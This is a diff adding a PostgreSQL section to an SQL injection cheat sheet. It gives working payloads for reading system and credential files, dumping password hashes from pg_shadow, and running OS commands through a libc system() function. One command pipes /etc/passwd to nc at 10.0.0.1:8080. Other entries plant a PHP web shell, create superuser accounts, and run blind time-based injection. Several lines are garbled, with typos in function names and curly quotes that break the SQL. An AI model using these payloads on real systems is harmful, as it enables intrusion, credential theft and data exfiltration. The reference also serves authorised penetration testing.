@@ -528,3 +528,218 @@ list user privsSELECT grantee, table_schema, privilege_type FROM information_sch
 
 SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
 — This command lists privileges on columns.
+
+Postgressql
+
+Query Command
+
+Version
+SELECT version();
+— This command obtains the version and built information of a database.
+
+List Users
+SELECT usename FROM pg_user;
+— This command obtains the column ‘usename’ from the table ‘pg_user’.
+
+Current User
+SELECT user;
+— This command obtains a name of recently logged in user.
+
+SELECT current_user;
+— This command obtains a name of current user.
+
+SELECT session_user;
+— This command obtains a name of current session user.
+
+SELECT usename FROM pg_user;
+— This command obtains the column ‘usename’ from table ‘pg_user’.
+SELECT getpgusername();
+— This command obtains the user name in current session.
+
+List all Database
+SELECT datname FROM pg_database;
+— This command obtains the list of database in column ‘datname’ from table ‘pg_database’.
+
+Current Database
+SELECT current_database();
+— This command obtains the current database.
+
+Load File
+SELECT pg_read_file('global/pg_hba.conf',0,10000000);
+— This command is used to read only the content of the DATA directory.
+
+List Tables
+SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid);
+— This command lists the tables present in the database. 
+
+List Columns 
+SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’);
+— This command lists the columns present in the database.
+
+Select Nth Row
+SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0;
+— This command returns rows numbered from 0.
+
+SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;
+— This command returns rows numbered from 1.
+
+Select Nth Char
+SELECT substr(‘abcd’, 3, 1);
+— This command returns c.
+
+If Statement
+IF statements only seem valid inside functions, therefore they are of less use in SQL injection statement. See CASE statement instead.
+
+Case Statement
+SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
+— This command returns A.
+
+Comments
+SELECT 1;
+— This command is used for writing a comment.
+
+SELECT /*comment*/1;
+— This command is used to comment out a statement.
+
+String without Quotes
+SELECT (CHAR(75)||CHAR(76)||CHAR(77))
+— This command will return ‘KLM’.
+
+Time Delay
+SELECT pg_sleep(10);
+— This command triggers a measurable sleep time.
+— In postgres is 8.2+ only.
+
+CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10);
+— This command is to create your own sleep function.
+
+Command Execution
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; 
+— priv
+
+SELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′);
+— This commands run as postgres/pgsql OS-level user.
+
+Make DNS Requests
+Generally, not it is not applicable in postgres. However,
+if contrib/dblinkis installed (it isn’t by default) it can be used to
+resolve hostnames (assuming you have DBA rights):
+SELECT * FROM dblink('host=put.your.hostname.here user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT); Alternatively, 
+if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”.
+
+Remote Authentication
+You should add “host” record to the pg_hba.conf file located in the DATA directory. host all all 192.168.20.0/24 md5;
+
+List Passwords
+SELECT pg_read_file('global/pg_auth',0,10000000);
+— This command lists passwords from a given database.
+
+List Password Hashes
+SELECT usename, passwd FROM pg_shadow;
+— This command is used obtain password hashes from a given database.
+
+Bulk Insert
+To read data from local files, first you should create a temporary
+file for that. Read file contents into this table, then read the data from table.
+
+CREATE TABLE temptable(t text);
+COPY temptable FROM 'c:/boot.ini';
+SELECT * FROM temptable LIMIT 1 OFFSET 0
+This functionality needs permissions for the service user who
+has been running database service. On default, it is not possible
+to read local files on Windows systems because postgres user
+doesn’t have read permissions.
+Drop the temporary file after exploitation.
+DROP TABLE temptable;
+
+Create Users
+CREATE USER test1 PASSWORD ‘pass1';
+— This command creates a user name ‘USER test1’ having password ‘pass1’.
+
+CREATE USER test1 PASSWORD ‘pass1' CREATEUSER;
+— This command creates a user name ‘USER test1’ having password ‘pass1’ and at the same time privileges are granted the user.
+
+Drop User
+DROP USER test1;
+— This command drops user name ‘USER test1’.
+
+List DBA Accounts
+
+SELECT usename FROM pg_user WHERE usesuper IS TRUE
+— This command obtains a list of user names with DBA privileges.
+
+Make user DBA
+ALTER USER test1 CREATEUSER CREATEDB;
+— This command grants DBA privileges to a user name ‘USER test1’.
+
+Local File Access
+CREATE TABLE mydata(t text);
+COPY mydata FROM ‘/etc/passwd’;
+— priv, can read files which are readable by postgres OS-level
+user
+
+…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1;
+— This command gets data back one row at a time.
+
+…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2;
+— This command gets data back one row at a time.
+
+DROP TABLE mytest mytest;Write to a file:
+— This command drops a table and then write it to another text file.
+
+CREATE TABLE mytable (mycol text);
+INSERT INTO mytable(mycol) VALUES (‘<?
+pasthru($_GET[cmd]); ?>’);
+COPY mytable (mycol) TO ‘/tmp/test.php’;
+— priv, write files as postgres OS-level user. Generally, you will not be able to write to the web root.
+— priv user can also read/write files by mapping libc functions.
+
+Hostname, IP Address
+SELECT inet_server_addr();
+— This command returns db server IP address (or null if using local connection).
+
+SELECT inet_server_port();
+— This command returns db server IP address (or null if using local connection)
+
+Error Based SQLi attack: To throw conversion errors.
+
+cast((chr(95)||current_database()) as numeric);
+— This command is used to receive integer inputs.
+
+'||cast((chr(95)||current_database()) as numeric)||';
+— This command is used to receive string inputs.
+
+Clear SQLi Tests: For Boolean SQL injection and silent attacks
+product.php?id=4
+product.php?id=5-1
+product.php?id=4 OR 1=1
+product.php?id=-1 OR 17-7=10
+— These commands can be used as tests for Boolean SQLinjection and silent attacks.
+
+Time based SQLi Exploitation
+?vulnerableParam=-1; SELECT CASE WHEN (COALESCE(ASCII(SUBSTR(({INJECTION}),1,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+;
+{INJECTION} = You want to run the query.
+— If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
+
+Default Databases
+template0
+template1
+
+Path of DB files
+SELECT current_setting('data_directory');
+— This command returns the path of data_directory
+(C:/Program Files/PostgreSQL/8.3/data)
+
+SELECT current_setting('hba_file');
+— This command returns the path of hba_file (C:/Program Files/PostgreSQL/8.3/data/pg_hba.conf)
+
+Location of DB Files
+SELECT current_setting(‘data_directory’);
+— This command returns the location of the data_directory.
+
+SELECT current_setting(‘hba_file’);
+— This command returns the location of the hba_file. 
+
+privileges
+SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+— This command returns the user names along with their privileges from the table ‘pg_user’.
